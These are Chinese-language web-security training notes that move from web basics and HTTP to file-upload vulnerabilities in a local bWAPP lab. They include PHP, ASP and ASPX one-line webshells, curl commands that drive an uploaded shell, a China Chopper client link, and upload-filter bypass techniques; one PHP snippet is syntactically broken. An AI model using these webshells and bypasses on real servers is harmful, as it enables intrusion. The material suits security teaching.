#  Hacker Me Web

## Web 安全基础

### HTML

#### HTML开发工具 

- Visual Studio Code
- Atom
- Sublime Text
- Vim

![1616830983487](HackerMeWeb.assets/1616830983487.png)

- 前端开发是创建Web页面或App等前端界面呈现给用户的过程。
  - HTML，CSS 及 JavaScript
- 网页制作是Web1.0时代的产物，早期网站主要内容都是静态，以图片和文字为主，用户使用网站的行为也以浏览为主。
- 随着互联网技术的发展和HTML5、CSS3 的应用，现代网页更加美观，交互效果显著，功能更加强大。 



#### HTML入门介绍 

- 为什么前后端分离？
  - 性能问题 & 学习成本
  - 将原本服务端的得计算，转移到用户端
- 前后端的走向？
  - 前端：页面表现，速度流畅，兼容性，用户体验等等
  - 后端：三高（高并发，高可用，高性能），安全，存储，业务等等 
- HTML 是什么？
  - HTML（ HyperText Markup Language）即超文本标记语言，是用来构建网页的一种语言。
  - HTML是一整套标记标签构成的标记语言，而非编程语言。
  - HTML用于承载网页的内容（文本、图片、语音、视频）。
- 通俗的讲：
  - 使用HTML标记标签与纯文本按规则构建的文档，通常也称为网页。 
- 文档—>网页
  - 浏览器通过对HTML文档解析，根据标签的顺序，按指定标签对应的规则显示纯文本内容。 



#### HTML网页结构 

- 一个标准的HTML页面由以下三个部分组成:
  - ① HTML版本声明
  - ② HTML头部
  - ③ HTML主体 

![1616831716511](HackerMeWeb.assets/1616831716511.png)

- HTML版本声明 :
  - 标签<!DOCTYPE html>
  - 它不是 HTML 标签，而是指示web 浏览器关于页面使用哪个 HTML 版本进行编写的指令。 
- HTML头部部分:
  - 标签 <head> </head>
  - 涉及页面标题、字符集、样式、链接等内容

```html
<titile> 页面标题必须存在
<base>   为所有链接指定默认地址
<link>   定义文档与外部资源之间的关系
<style>  定义样式信息
<script> 定义客户端脚本，比如 JavaScript
<meta>   定义关于 HTML 文档的元数据，用于规定页面的描述、关键词、文档的作者等。搜索引擎引擎会利meta元素的 name 和 content 属性来索引页面。 
```

- HTML主体部分：
  - 标签<body></body>
  - 浏览器展现给用户的内容，包括标题、文本、段落、链接、图片、媒体等，所有的页面内容都由HTML主体部分标签来实现。 
  - 标签之间可按照规则嵌套。 

```html
<p>hello</p>           标识一个段落
<a href=“url”>text</a> 标识一个链接文本
<ol><ul><li>           列表项相关
<table><tr><td>        表格项相关
<img>                  标识一个图片信息
<b><i>                 字体相关标签
<form><input>          表单相关标签
```



#### HTML标签/元素/属性 

- 标签
  - HTML页面由标签和内容组成，标签一般是成对出现，由开始和结束标签组成，如：


```html
<p></p>
<img/>
```

- 元素
  - HTML元素指的是开始标签到结束标签的所有代码，包括开始结束标签，如：

```html
<p>hello</p>
```

- 属性
  - 属性一般描述于开始标签中，用于对元素提供附加信息如：

```html
<img src=“image/geektime.png” width=30% height=30% alt=“图片加载失败" />
```



#### HTML练习

- github：HackerMeCode\HTML\HTMLDemo1.html
- github：HackerMeCode\HTML\HTMLDemo2.html



#### HTML学习资料

- https://developer.mozilla.org/zh-CN/docs/Web/HTML



### CSS

#### CSS入门介绍 

- 层叠样式表（英文全称：Cascading Style Sheets）是一种用来表现HTML（标准通用标记语言的一个应用）或 XML（标准通用标记语言的一个子集）等文件样式的计算机语言。
- CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。 



#### CSS学习资料

- https://developer.mozilla.org/zh-CN/docs/Web/CSS



### JavaScript

#### JavaScript入门介绍 

- JavaScript是什么？
  - JavaScript，是可插入 HTML 页面，可以由绝大多数现代浏览器执行的轻量级的编程语言。
  - JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。
- 它和Web安全有什么关系？
  - 作为一种脚本语言，由它引申出的 XSS 攻击，文件上传漏洞，常年占据 OWASP Top10。
- Node.js
  - 简单的说 Node.js 就是运行在服务端的 JavaScript。
  - Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。
  - Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。 
- JavaScript 功能 
  - ① 做出反应 
  - ② 改变HTML内容 
  - ③ 改变HTML样式 
  - ④ 验证输入 



#### JavaScript练习

- github：HackerMeCode\JavaScript\JavaScriptDemo.html



#### JavaScript学习资料

- JavaScript：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript
- Node.js：https://developer.mozilla.org/zh-CN/docs/Glossary/Node.js





### Web App

#### Web App是什么？

- Web App（或Web应用程序）运行于网络和标准浏览器上，基于网页技术开发实现特定功能的应用。
  - 前端：HTML，CSS，JavaScript
  - 后端：Java，Python，PHP
  - 数据库：MySQL，Oracle，MongoDB
  - 容器：Windows(IIS)，Linux(Nginx, Apache)
  - 协议：TCP，DNS，HTTP，HTTPS 
  



#### 从浏览器输入网址到看到网页，这个过程发生了什么？ 

  - 用户： 
    - 浏览器输入了一个地址 
    - 浏览器显示了一个网页 
- 显示网页的原理：
  - 客户输入URL，DNS解析URL得出IP地址，根据IP地址找出对应服务器
  - 客户机通过TCP/IP协议建立到Web服务器的TCP链接
  - 客户机向Web服务器发送HTTP请求报文，请求服务器里资源的资源文档
  - Web服务器接收到客户机的HTTP请求报文，然后向客户机发出HTTP响应报文 
  - 如果请求的是HTML文档，Web服务器会将对应目录下相应的HTML文档打开，然后将文档的响应内容发送给客户机。
  - 如果请求的是PHP文件，那么Web服务器自身是不能处理PHP动态语言脚本文件的，然后就会寻找并委托PHP应用服务器，PHP应用服务器会将Web服务器请求的PHP文件解析成HTML静态代码，然后将HTML静态代码发送给Web服务器，最后Web服务器会将HTML静态代码发送客户机。
  - 如果请求的资源是访问数据库，则Web服务器会通过PHP应用服务器去访问数据库。 
  - 客户机解析HTML静态文档
  - 客户机与服务器断开链接 



#### 常见的 Web 服务器有哪些？

  - Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源代码的网页服务器软件，可以在大多数电脑操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器软件之一。
  - Nginx（发音同engine x）是一个网页服务器，它能反向代理HTTP, HTTPS, SMTP, POP3, IMAP的协议链接，以及一个负载均衡器和一个HTTP缓存。Nginx是一款面向性能设计的HTTP服务器，相较于Apache、lighttpd具有占有内存少，稳定性高等优势。
  - IIS是Internet Information Server的缩写。它是微软公司主推的服务器。
  - Lighttpd是一个德国人领导的开源Web服务器软件,具有非常低的内存开销、CPU占用率低、效能好以及丰富的模块等特点。
  - Tomcat是Apache软件基金会的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。Tomcat技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web应用服务器。 

​    

#### Python实现简单服务器 

- 程序，参见：github：HackerMeCode\WebApp\python_imple_server.py
- 执行命令：python python_imple_server.py
- 不同浏览器显示了不同的控制台结果：
  - Chrome Browser
  - Firefox Browser
  - Microsoft Edge Browser



#### 什么是框架

- Web应用框架（Web application framework）是一种开发框架，用来支持动态网站、网络应用程序及网络服务的开发。其类型有基于请求的和基于组件的两种框架。
- 有助于减轻网页开发时共通性活动的工作负荷，例如许多框架提供数据库访问接口、标准样板以及会话管理等，可提升代码的可再用性。 
- 提供了某应用领域通用完备功能（除去特殊应用的部分）的底层服务的程序集合。 
  - 前端：jQuery、Bootstrap、React.js、Vue.js
  - 后端：Spring MVC、Django、Flash、Tornado



#### Python建站 

- 什么是Django 

  - Django是一个开放源代码的Web应用框架，由Python写成。
  - 采用了MTV的框架模式，即模型M（Model），视图V（View）和模版T（Template）。
  - 它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即CMS（内容管理系统）软件。并于2005年7月在BSD许可证下发布。 

- 创建第一个项目 

  - 安装Django环境
    - Python –m pip install django
  - 创建第一个项目
    - django-admin startproject mysite
  - 命令行命令
    - ls -l
    - dir
    - tree ./
    - cd mysite/
  - 启动
    - python manage.py runserver 0.0.0.0:8000

- 项目文件介绍：

  - manage.py
    - Django用于管理本项目的命令行工具。
  - _\_init__.py
    - 一个普通的包初始化模块。
  - settings.py
    - Django项目的配置文件 ， 本项目引用的组件，项目名， 数据库配置， 时间、语言 ，静态文件访问地址和存储路径。
  - wsgi.py 
    - Web Server gateway interface
    - 接口信息用于服务器部署。 

- Django应用注册及建立 

  - django-admin startapp firstapp 

  - 注册 app，添加 template 路径，开放外部主机访问权限

    - mysite/settings.py

      - ```python
        ALLOWED_HOSTS = ['*']  # 允许外部主机访问
        
        INSTALLED_APPS = [
            'django.contrib.admin',
            'django.contrib.auth',
            'django.contrib.contenttypes',
            'django.contrib.sessions',
            'django.contrib.messages',
            'django.contrib.staticfiles',
            'mysite',  # 注册 mysite
        ]
        
        TEMPLATES = [
            {
                'BACKEND': 'django.template.backends.django.DjangoTemplates',
                'DIRS': [os.path.join(BASE_DIR, 'template')],  # 添加路径模板
                'APP_DIRS': True,
                'OPTIONS': {
                    'context_processors': [
                        'django.template.context_processors.debug',
                        'django.template.context_processors.request',
                        'django.contrib.auth.context_processors.auth',
                        'django.contrib.messages.context_processors.messages',
                    ],
                },
            },
        ]
        ```

  - Django应用添加URL映射关系 

    - firstapp/views.py
      - 添加函数
    - mysite/urls.py
      - 添加路径映射 URL
    - 启动应用
      - python manage.py runserver 0.0.0.0:8000
    - 访问
      - http://127.0.0.1:8000/helloworld

- 数据库迁移与创建账号 

  - 迁移数据，初始化数据表
    - python manage.py makemigrations 
    - python manage.py migrate 
  - 在mysite 目录下创建 管理员 账号 
    - python manage.py createsuperuser 
  - 启动应用
  - 访问
    - http://127.0.0.1:8000/admin/
    - 用户名：root
    - 密码：root



### HTTP协议基础 

#### HTTP协议是怎么工作的 

- HTTP协议定义了Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。
- 客户端连接到Web服务器
  - 一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。
- 发送HTTP请求
  - 通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据 4部分组成。
- 服务器接受请求并返回HTTP响应
  - Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。
  - 一个响应由状态行、响应头部、空行（请求空行）和响应数据（请求体）4部分组成。
- 释放连接TCP连接
  - 若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接。
  - 若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求。
- 客户端浏览器解析HTML内容 



#### HTTP协议 

- 请求方法
  - GET和POST是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。
  - 不过，当前的大多数浏览器只支持GET和POST
- 常见的报文头的属性有很多 

![1616894719841](HackerMeWeb.assets/1616894719841.png)



#### GET vs POST 

- 从参数的传递方面来看,GET请求的参数是直接拼接在地址栏URL的后面,而POST请求的参数是放到请求体里面的。
- 从长度限制方面来看,GET请求有具体的长度限制,一般不超过1024KB,而POST理论上没有,但是浏览器一般有个界限。
- 从安全方面来看,GET请求相较于POST,因为数据都是明文显示在URL上面的,所以安全和私密性不如POST。
- 从本质上来说，GET和POST都是TCP连接，并无实质的区别。但是由于HTTP/浏览器的限定，导致它们在应用过程中体现出了一些不同。GET产生一个数据包，POST产生两个数据包。对于GET请求，浏览器会把http header 和 data 一并发出去,服务器响应200(返回数据)。而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。 



#### HTTP请求方法和响应代码 

![1616894968238](HackerMeWeb.assets/1616894968238.png)

![1616894988927](HackerMeWeb.assets/1616894988927.png)



### Web 安全溯源 

#### Web安全的起源 

- Web应用全部都是建立在HTTP协议基础上，是对HTTP协议的实际应用。
- Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击。 

![1616895500534](HackerMeWeb.assets/1616895500534.png)



#### Web安全攻防要点 

![1616895805998](HackerMeWeb.assets/1616895805998.png)

#### Web 安全的本质是什么 

- 应用问题？
- 协议问题？
- 都不是！！！



#### 安全溯源 

- 信任问题
  - 前端输入不可信
- Web安全根本在于，Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击。 



### Web渗透工具 

#### Burp Suite 

- Burp Suite是用于攻击Web应用程序的集成平台框架。 它包含了许多Web安全相关工具， 也同时设计了接口，满足了安全人员自行拓展程序功能的需求。 
- Burp功能
  - Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。
  - Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。
  - Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。
  - Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。
  - Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。
  - Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 
- 下载安装
  - https://portswigger.net/burp/communitydownload
- 设置代理 
  - Proxy -> Intercept -> 关闭 Intercept is on
  - Proxy -> Options -> 本地 8080端口 
  - 浏览器：选项 -> 网络设置 -> 手动配置代理 -> HTTP 代理，端口
- 设置代理 - Mac 
  - 系统偏好设置 -> 网络 -> 高级 -> 代理 -> 网页代理（HTTP）
- 代理 - Windows 
  - 网络代理管理 -> 使用代理服务器



#### curl 

- curl 是一个功能强大灵活的网络工具，使用url的形式传输数据， 支持 HTTPS，IMAP，POP3，RTSP，SCP，FTP， FTPS，TFTP， SMTP以及SMB， Telnet等协议。
- 多用于用在抓取网页、网络监控等方面的开发，解决开发中遇到的问题。 
- Mac 自带
- windows 安装
  - https://curl.se/download.html
  - 将解压路径添加至环境变量
- 命令：
  - curl www.baidu.com
  - curl www.baidu.com -I
  - man curl
  - curl -h
  - curl ifconfig.co
  - curl ifconfig.co -v
- curl 使用场景小览 
  - -A参数指定客户端的用户代理标头，即User-Agent。
  - -b参数用来向服务器发送 Cookie。
  - -c参数将服务器设置的 Cookie 写入一个文件。
  - -d参数用于发送 POST 请求的数据体。
  - -e参数用来设置 HTTP 的标头Referer，表示请求的来源。 
  - -F参数用来向服务器上传二进制文件。
  - -G参数用来构造 URL 的查询字符串。
  - -H参数添加 HTTP 请求的标头。 



#### Postman 

- Postman是一款功能强大的网页调试与发送网页HTTP请求的工具
- 不仅可以调试简单的CSS、HTML、脚本等简单的网页基本信息，它还可以发送几乎所有类型的HTTP请求
- 可视化版本的curl
- 使用非常傻瓜，所见即所得
- 下载安装
  - https://www.postman.com/downloads/



#### HackBar 

- Firefox 浏览器插件，包含一些常用的工具。(SQL injection,XSS,加密等)，可以利用它，快速构建一个HTTP请求，或者用它快速实现某种算法等，多用于手工测试Web漏洞。 
- 安装
  - Firefox 浏览器 -> 附加组件 -> 寻找更多组件Wappalyzer -> 添加组件



#### Wappalyzer 

- Wappalyzer是一款功能强大的、且非常实用的网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、网站环境、服务器配置环境、JavaScript框架、编程语言等参数。
- 官网：https://www.wappalyzer.com/ 
- 支持平台：Firefox，Edge，Chrome
- 安装
  - 插件管理直接安装







## 后端安全

### 文件上传漏洞

#### 文件上传漏洞是什么？

- 文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。
- 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。 



#### Docker 使用

- 官网
  - https://www.docker.com/
- 下载安装，并启动
- 安装成功： docker -v
- 下载 Docker 镜像
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
- 启动
  - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
- 查看启动应用
  - docker container list -a
  - docker ps
  - 关闭 容器：docker stop zealous_heyrovsky
  - 启动 已经存在的容器：docker start zealous_heyrovsky
  - 重启容器：docker restart zealous_heyrovsky
  - docker 重命名：docker rename busy_blackwell centos



#### Webshell

- 启动 bwapp  应用
- 访问应用
  - http://127.0.0.1/login.php
- 初始化应用
  - http://127.0.0.1/install.php
  - click heren to install bWAPP
- 注册账号
  - root
  - root1234
- 登录用户
- 选择文件上传功能
  - Choose your bug: Unrestricted File Upload
  - 点击 Hack
- 编辑木马文件

```php
// shell.php

<?php @eval($_POST['hacker']); ?>
```

- 上传木马文件
  - 选择文件
  - upload
- 查看上传木马文件
  - http://127.0.0.1/images/shell.php
- 让 Webshell 执行 PHP 的 API 命令
  - get_current_user()
  - getcwd()

```sh
curl -d "hacker=echo get_current_user();" http://127.0.0.1/images/shell.php

curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
```

![1617006814673](HackerMeWeb.assets/1617006814673.png)



#### 中国菜刀

- 简介：中国菜刀是一个 Webshell 集成环境 
- 下载链接
  - https://github.com/raddyfiy/caidao-official-version
  - 做 MD5 校验，杜绝黑吃黑
- 双击打开 caidao.exe --> 右键添加 SHELL --> 写入地址 与 变量 --> 双击进入服务器目录
- 右键打开 虚拟终端 --> 执行端口查询命令 $ netstat -an | grep ESTABLISHED





#### 一句话木马

- asp 一句话木马：
  - <%execute(request("value"))%> 
- php 一句话木马：
  - <?php @eval($_POST[“value”]);?> 
- aspx 一句话木马：
  - <%@ Page Language="Jscript"%>
  - <%eval(Request.Item["value"])%> 
- 其他一句话木马 
  - <%eval request("value")%>
  - <%execute request("value")%>
  - <%execute(request("value"))%> 



#### 后缀名绕过

- 设置安全等级：Set your security level: **medium**

- 上传文件: upload shell.php

  - 上传失败
  - Sorry, the file extension is not allowed. The following extensions are blocked: **asp, aspx, dll, exe, jsp, php**

- 更改文件名：upload shell.php3

  - 上传成功
  - 中国菜刀进入成功

- 更改文件名：upload shell.php30

  - 上传成功
  - 中国菜刀进入失败

- 思考：后缀名改为 .php3，尝试绕过可以，为什么 .php30 后缀不行呢？ 

- 后缀名绕过原理

  - 显示所有运行的容器：docker ps
  - 进入docker交互的shell 中：docker exec -it fffcfba80832 bash
  - 查看网络连接：netstat -antp
  - 查看网络连接并过滤80端口：netstat -antp| grep 80
  - 找到 apache2 的配置文件目录： cd /etc/apache2/
  - 查看配置文件：vim apache2.conf
  - 找到module加载配置：

  ```sh
  # Include module configuration:
  IncludeOptional mods-enabled/*.load
  IncludeOptional mods-enabled/*.conf  # 加载配置
  ```

  - 进入：cd mods-enabled
  - 找到php5.conf配置文件 ，并打开，查看源码

  ```sh
  # 根据匹配规则，可以匹配到php,php3,php4,php5,phpt,phptml
  
  <FilesMatch ".+\.ph(p[345]?|t|tml)$">  
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```

  

#### 服务器关联型漏洞 

##### IIS 5.x / 6.0 解析漏洞 

- 漏洞1：当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件
- 漏洞2：服务器默认不解析“;”以后的内容

- 漏洞利用形式：

  - 漏洞1：www.xxx.com/xx.asp/xx.jpg 会被解析成asp文件
  - 漏洞2：www.xxx.com/xx.asp;.jpg 会被解析成为asp文件 



##### Nginx 解析漏洞 

  - 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。
  - PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的。
  - 当URL中有不存在的文件时，PHP就会默认向前解析。
- 漏洞利用流程：

  1. 访问：www.xx.com/phpinfo.jpg/1.php （1.php不存在）
  2. 会解析phpinfo.jpg文件，但是按照php格式解析 



##### Apache 解析漏洞 

- Apache 在1.x和2.x版本中存在解析漏洞：
- Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。
- 漏洞利用流程：
  1. 上传shell.php.test；
  2. 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。 



#### 前端验证绕过 

- 很多网站、CMS 都有使用，只在前端利用 JavaScript 来做校验。
- 漏洞利用流程（两种方法都可以）：
  1. 通过Burp Suite抓包，然后修改内容后放行。
  2. 通过Chrome禁止/删除JavaScript代码。（Delete element） 





#### .htaccess绕过 

- 什么是.htaccess?
  
  - .htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。
- 如何利用.htaccess?
  
  - 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。
- 思考🤔：
  1. 为什么不能绕过限制较全面的白名单过滤呢？
  2. 那么如何实操来绕过黑名单过滤呢？ 
- 漏洞利用流程:
  - 上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】。
  2. 上传一句话木马文件，文件名设置为shell.test。
  - 在浏览器中访问shell.test即可执行一句话木马。
- 思考🤔：
  
  - 为什么shell.test会成功执行呢？ 





#### 大小写绕过 

- 这是一种比较简单的绕过方式，同样针对黑名单。
- 如果我们想上传一个php木马，那么我们可以上传一个pHp即可。
- 值得思考的问题出现了🤔
  1. php真的等同于pHp吗？
  2. 如果不等同，为什么pHp可以执行呢？ 
- Windows 平台
  - 测试 echo 111 > test.txt
  - 测试 echo 222 > test.tXt
  - 由于大小写不敏感，最终只会有一个文件 test.txt，内容也会被覆盖为 222
- Linux 平台
  - 测试 echo 111 > test.txt
  - 测试 echo 222 > test.tXt
  - 大小写不敏感，文件夹中会有两个文件，内容不一样
- 关于 Linux + Apache 服务器 URL 区分大小写问题
  - linux 服务器的大小写敏感有时候很不方便，在地址栏里一定要输入准确的URL才能访问，对搜索引擎和用户不是很友好，那么如何解决linux服务器URL的大小写问题。
  - 今天同步碰到一个问题，在浏览器地址栏中输入URL地址时，必须要区分大小写才能正常访问页面，网站服务器是Linux+Apache，造成此现象的主要原因是缺少 Speling 模块，因此只要在相应的系统里加载就可以了。



#### Windows 文件流特性绕过 

- 什么是Windows文件流？
  - NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。
- 我们来用Windows平台做一些测试：
  1. Echo 111 > test.txt:111.txt
     1. 使用命名的文件流111.txt创建文件 test.txt
     2. 直接打开，文件中没有数据，查看属性0字节
     3. 使用 notepad test.txt:111.txt 打开可以看到内容
  2. Echo test > test.txt
     1. 使用默认的文件流创建文件 test.txt
     2. 文件中的数据变成 test
     3. 查看属性7字节
  3. Echo 222 > test.txt::$data
    1. 使用默认的文件流，:$data，创建文件 test.txt
    2. 直接打开，看到数据，查看属性6字节
- 说明了哪些问题？
- 我们又该如何利用这个漏洞进行绕过及Webshell上传呢？ 





#### %00 截断绕过

- 可以看到黑名单会存在巨大的被绕过的风险，无论是服务器原因还是操作系统原因，那么白名单是否完全安全呢？ 

  - 还是不安全啊

- 首先来看一下substr是做什么的？ 

  ```php
  <? php
  $is_upload = false;
  $msg = null;
  if(isset($_POST['submit'])){
      $ext_arr = array('jpg', 'png', 'gif');
      $file_ext = substr($_FILES['upload_file']['name'], strrpos($_FILES['upload_file']['name'], ".")+1);
      if(in_array($file_ext, $ext_arr)){
          $temp_file = $_FILES['upload_file']['tmp_name'];
          $img_path = $_POST['save_path']."/".rand(1, 99).date("YmdHis" ).".".$file_ext;
          if(move_uploaded_file($temp_file,$img_path)) {
              $is_upload = true;
          }else {
              $msg = "上传失败";
          }else {
              $msg ="只允许上传.jpg|.png|.gif类型文件! ";
          }
      }
  }
      
  ?>
  ```

- 可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。

- 但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。 

- 漏洞利用流程:

  - 设置save_path=../upload/a.php%00
  2. 上传一个内容为一句话木马的jpg文件 

- 测试流程

  - cp shell.php shell.php.jpg
  - 上传shell.php.jpg
  - 使用 burp Suite，打开 Intercept is on, 拦截上传文件的请求
  - 改shell.php.jpg 为shell.png .jpg，选中png后面的空格，在右边栏更改原始20code为00，并且应用
  - 此时鼠标的光标在g后面就有一个间隔位置，点击Forward
  - 关闭 Intercept is off，此时上传文件成功 



#### 文件头检测绕过 

- 常见文件头格式
  - png/jpg/gif

![1617074739806](HackerMeWeb.assets/1617074739806.png)

- 拼接png与php文件，尝试执行 
  - 复制一份：cp test.png test2.png
  - php内容添加到png后面：cat test.php >> test2.png
  - php 可以执行新文件：php test2.png



#### 文件上传绕过类型

- Content-Type绕过 
- 前端绕过
- 文件解析规则绕过
- windows 环境特性绕过
- 大小写、双写、点空格、文件头、条件竞争绕过



#### 源码审计

- 使用bWAPP将security level 设置为 High

  - 尝试直接上传，失败。
  - 尝试修改文件后缀，失败。
  - 可以看出是基于白名单，那么是否可以采用截断方式呢？ 
    - 不可以，我们要理解截断方式可以生效的根本原因是什么：
    - 是我们可以 分别控制 存储路径 及 文件名称
    - 这样我们才可以实现通过文件名称校验的同时存储为php文件 

- 验证一下是否符合我们的思路之代码审计 

  - 显示所有运行的容器：docker ps

  - 进入docker交互的shell 中：docker exec -it fffcfba80832 bash

  - 查看网络连接：netstat -antp

  - 查看网络连接并过滤80端口：netstat -antp| grep 80

  - 找到 apache2 的配置文件目录： cd /etc/apache2/

  - 查看配置文件：vim apache2.conf，从配置文件中找到web根目录 

    ```php
    <Directory /var/www/>
            Options Indexes FollowSymLinks
            AllowOverride None
            Require all granted
    </Directory>
    ```

  - 进入 web 目录，cd /var/www/html，通过Vim查看unrestricted_file_upload.php这个文件 

    ```php
    include("security.php");
    include("security_level_check.php");
    include("functions_external.php");  // 链接进来的文件中包含执行的 file_upload_check_1 和 file_upload_check_2 方法
    include("selections.php");
    
     switch($_COOKIE["security_level"])  // 根据 $_COOKIE 中的security_level数组，判断执行的方法
        {
    
            case "0" :
                    echo "test";
                move_uploaded_file($_FILES["file"]["tmp_name"], "images/" . $_FILES["file"]["name"]);
                break;
    
            case "1" :
                $file_error = file_upload_check_1($_FILES["file"]);
                break;
    
            case "2" :
    
                $file_error = file_upload_check_2($_FILES["file"], array("jpg","png"));
                break;
    
            default :
                move_uploaded_file($_FILES["file"]["tmp_name"],"images/" . $_FILES["file"]["name"]);
                break;
    
        }
    ```

  - 进入functions_external.php文件，追踪定位到关键函数——file_upload_check_2() 

    ```php
    function file_upload_check_2($file, $file_extensions  = array("jpeg", "jpg", "png", "gif"), $directory = "images")
    {
        ...
         // Breaks the file in pieces (.) All pieces are put in an array
        $file_array = explode(".", $file["name"]);
        // Puts the last part of the array (= the file extension) in a new variabele
        // Converts the characters to lower case
        $file_extension = strtolower($file_array[count($file_array) - 1]);
        // Searches if the file extension exists in the 'allowed' file extensions array  // 白名单
        if(!in_array($file_extension, $file_extensions))
        {
           $file_error = "Sorry, the file extension is not allowed. Only the following extensions are allowed: <b>" . join(", ", $file_extensions) . "</b>";
           return $file_error;
        }
    }
    ```

  - 确认逻辑代码安全性 & 通过php API reference来确认关键函数调用安全性 

    - explode（）

      ![1617082126465](HackerMeWeb.assets/1617082126465.png)

    - in_array（）

      ![1617082147475](HackerMeWeb.assets/1617082147475.png)

  - 可以发现由于PHP语言的特性，in_array()函数调用使用了默认的松散比较 

    - 松散比较会出现问题的情况

      ![1617082199229](HackerMeWeb.assets/1617082199229.png)

  - 通过源码审计，我们可以发现我们无法同时满足以下两个条件：
    1. 保证上传的文件名类型满足jpg/png；
    2. 保证存储的文件名为php/php3等类型；

  - 因此该文件上传点我们无法直接利用。 

- 漏洞链 

  - 那么我们该如何利用这个文件上传漏洞呢？
  - 答案是通过漏洞之间的联合利用，基于我们已经成功上传一句话木马内容的jpg，联合使用本地/远程文件包含漏洞，既可以完成本次渗透。 



#### Fuzz 

- 模糊测试
  - 模糊测试（fuzz testing, fuzzing）是一种软件测试技术。
  - 其核心思想是将自动或半自动生层的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。
  - 模糊测试最早由威斯康星大学的Barton Miller 于1988年提出，他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件，并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。
  - link：https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95
- Web 安全与 Fuzz
  - 使用 Burp Suite 进行 Fuzz 的使用
  - 设置上传的security level: **medium**，随便上传一个文件
  - 在Burp中找到上传失败的 HTTP ，右键 send to Intruder
  - 进入 Intruder 选项，点击 Postions ，在内部选择自己测试的部分，删除其他的 § 符号
  - 点击Payload，在 Payload Options[Simple list] 中，添加 new Item，如：txt，php，php3 等，可以积累一个自己的字典。
  - 点击 Start attack，弹出请求与响应的页面
  - 可以通过 Length 确定每一个响应的内容是什么，并进行比对
- 注意事项 
  - 模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用；而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。
  - 使用过程有几点需要注意：
    1. Fuzz过程由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃。
    2. Fuzz过程会产生大量负载，可能会对生产环境造成影响。
    3. 安全监测过程中很容易由于过多访问触发安全警报，进而为后续安全检测制造障碍。
